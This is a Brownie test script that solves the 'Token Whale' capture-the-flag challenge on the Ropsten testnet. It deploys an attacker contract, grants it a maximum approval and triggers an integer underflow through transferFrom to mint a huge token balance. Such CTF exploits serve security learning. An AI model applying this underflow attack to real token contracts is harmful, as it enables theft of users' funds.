from brownie import accounts, TokenWhaleChallenge, TokenWhaleAttacker

challenge_address = "0xD3FcdA7017c80Ffe1F78b436463FaE7c3AeC2d0e"
MAX_UINT = (2 ** 256) - 1

# --------------------------------------------------------------------
# To beat this challenge we must acquire a total of 1,000,000 tokens.
# we start out with 1,000 tokens
#
# we can achieve this by causing an integer underflow.
# --------------------------------------------------------------------
def test_token_whale():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge contract
    challenge = TokenWhaleChallenge.at(challenge_address)

    # deploy hacker contract
    hacker = TokenWhaleAttacker.deploy(challenge_address, {"from": account})

    # call approve for hacker contract
    tx = challenge.approve(hacker.address, MAX_UINT, {"from": account})
    tx.wait(1)

    # call transferFrom from hacker contract
    tx = hacker.transferFrom(account.address, account.address, 1, {"from": account})
    tx.wait(1)

    # view the token balance of the hacker contract
    print(challenge.balanceOf(hacker.address))

    # transfer 1,000,000 tokens from hacker contract to our account
    tx = hacker.transfer(account.address, 1000000, {"from": account})
    tx.wait(1)

    # view our token balance
    print(challenge.balanceOf(account.address))

    # confirm that we have passed the level
    assert challenge.isComplete()
